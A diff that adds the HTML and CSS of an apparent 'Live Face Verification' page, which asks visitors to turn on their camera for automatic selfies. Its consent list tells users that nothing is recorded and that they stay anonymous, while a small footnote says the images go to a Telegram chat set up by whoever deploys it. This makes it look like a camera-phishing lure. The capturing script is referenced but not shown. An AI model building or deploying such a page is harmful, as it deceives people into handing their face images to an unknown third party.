@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Face Verification</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    background: radial-gradient(circle at 20% 20%, #1e293b, #0b1120 70%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #e2e8f0;
+    padding: 16px;
+  }
+
+  .card {
+    background: rgba(15, 23, 42, 0.7);
+    backdrop-filter: blur(18px);
+    -webkit-backdrop-filter: blur(18px);
+    border-radius: 28px;
+    max-width: 460px;
+    width: 100%;
+    overflow: hidden;
+    border: 1px solid rgba(148, 163, 184, 0.15);
+    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255,255,255,0.06);
+  }
+
+  .head {
+    padding: 28px 30px 20px;
+    background: linear-gradient(135deg, rgba(59,130,246,0.15), rgba(139,92,246,0.1));
+    border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+  }
+
+  .head h1 {
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+    background: linear-gradient(90deg, #93c5fd, #c4b5fd);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .head p {
+    font-size: 12px;
+    color: #94a3b8;
+    margin-top: 4px;
+    font-weight: 400;
+  }
+
+  .body { padding: 26px 30px 30px; }
+
+  .step-conf { text-align: center; }
+
+  .ico {
+    font-size: 52px;
+    line-height: 1;
+    filter: drop-shadow(0 0 20px rgba(96,165,250,0.4));
+  }
+
+  h2 {
+    font-size: 18px;
+    font-weight: 650;
+    margin: 10px 0 6px;
+    color: #f1f5f9;
+  }
+
+  .desc {
+    font-size: 13.5px;
+    color: #94a3b8;
+    line-height: 1.6;
+    margin-bottom: 22px;
+  }
+
+  ul {
+    text-align: left;
+    font-size: 13px;
+    color: #cbd5e1;
+    list-style: none;
+    margin: 0 auto 26px;
+    max-width: 340px;
+  }
+
+  ul li {
+    padding: 7px 0 7px 28px;
+    position: relative;
+    border-bottom: 1px solid rgba(148, 163, 184, 0.08);
+  }
+
+  ul li:last-child { border-bottom: none; }
+
+  ul li::before {
+    content: "✦";
+    position: absolute;
+    left: 0;
+    color: #60a5fa;
+    font-weight: 700;
+    font-size: 14px;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 650;
+    cursor: pointer;
+    transition: all 0.25s ease;
+    box-shadow: 0 8px 24px rgba(59, 130, 246, 0.35);
+    letter-spacing: 0.2px;
+  }
+
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 32px rgba(59, 130, 246, 0.5);
+    filter: brightness(1.1);
+  }
+
+  .btn:active { transform: translateY(0); }
+
+  .btn:disabled {
+    background: #334155;
+    box-shadow: none;
+    cursor: not-allowed;
+    transform: none;
+    opacity: 0.6;
+  }
+
+  .cam-stage { display: none; text-align: center; }
+
+  video {
+    width: 100%;
+    border-radius: 18px;
+    background: #000;
+    transform: scaleX(-1);
+    border: 1px solid rgba(148, 163, 184, 0.2);
+    box-shadow: 0 0 40px rgba(59, 130, 246, 0.15);
+  }
+
+  .progress { margin-top: 18px; }
+
+  .bar {
+    height: 8px;
+    background: rgba(148, 163, 184, 0.15);
+    border-radius: 8px;
+    overflow: hidden;
+    border: 1px solid rgba(148, 163, 184, 0.1);
+  }
+
+  .fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #22c55e, #4ade80);
+    transition: width 0.5s ease;
+    border-radius: 8px;
+    box-shadow: 0 0 12px rgba(34, 197, 94, 0.5);
+  }
+
+  .pct {
+    font-size: 12px;
+    color: #94a3b8;
+    margin-top: 8px;
+    font-weight: 500;
+  }
+
+  .status {
+    margin-top: 14px;
+    font-size: 13px;
+    color: #cbd5e1;
+    min-height: 20px;
+  }
+
+  .done {
+    display: none;
+    text-align: center;
+    padding: 16px 0 8px;
+  }
+
+  .done .ico {
+    font-size: 64px;
+    filter: drop-shadow(0 0 30px rgba(34,197,94,0.6));
+  }
+
+  .done h3 {
+    font-size: 20px;
+    margin: 12px 0 6px;
+    color: #f1f5f9;
+    font-weight: 700;
+  }
+
+  .done p {
+    font-size: 13.5px;
+    color: #94a3b8;
+    line-height: 1.5;
+  }
+
+  .legal {
+    font-size: 10.5px;
+    color: #64748b;
+    margin-top: 22px;
+    line-height: 1.5;
+    text-align: center;
+    border-top: 1px solid rgba(148, 163, 184, 0.1);
+    padding-top: 16px;
+  }
+
+  canvas { display: none; }
+
+  @media (max-width: 480px) {
+    .head { padding: 22px 22px 16px; }
+    .body { padding: 20px 22px 24px; }
+    .card { border-radius: 22px; }
+    h2 { font-size: 17px; }
+    .ico { font-size: 44px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="head">
+    <h1>🔐 Live Presence Check</h1>
+    <p>Demo flow — verify on your own device</p>
+  </div>
+
+  <div class="body" id="bodyRoot">
+
+    <!-- STEP 1: Consent -->
+    <div class="step-conf" id="stepConsent">
+      <div class="ico">🤳</div>
+      <h2>Complete a quick face check</h2>
+      <div class="desc">Before continuing, take a short live selfie so the system can confirm a real person is present.</div>
+      <ul>
+        <li>Let us turn on your camera for ~5 seconds</li>
+        <li>3 quick selfies are captured automatically</li>
+        <li>Nothing is recorded — only sent once for verification</li>
+        <li>You stay anonymous: no name or account is attached</li>
+      </ul>
+      <button class="btn" id="btnStart">I agree — start camera</button>
+      <div class="legal">By continuing you consent to a short live camera check on this device. Demo: images are sent to a Telegram chat you configure. Test only on devices you own.</div>
+    </div>
+
+    <!-- STEP 2: Camera + capture -->
+    <div class="cam-stage" id="camStage">
+      <video id="video" autoplay playsinline muted></video>
+      <div class="progress">
+        <div class="bar"><div class="fill" id="barFill"></div></div>
+        <div class="pct" id="pctText">Starting…</div>
+      </div>
+      <div class="status" id="stageStatus"></div>
+    </div>
+
+    <!-- STEP 3: Done -->
+    <div class="done" id="doneStage">
+      <div class="ico">✅</div>
+      <h3>Check complete</h3>
+      <p id="doneMsg">Redirecting…</p>
+      <button class="btn" id="btnFinish" style="margin-top:18px;">Continue →</button>
+    </div>
+  </div>
+</div>
+
+<canvas id="canvas"></canvas>
+<script type="module" src="script.js"></script>
+</body>
+</html>
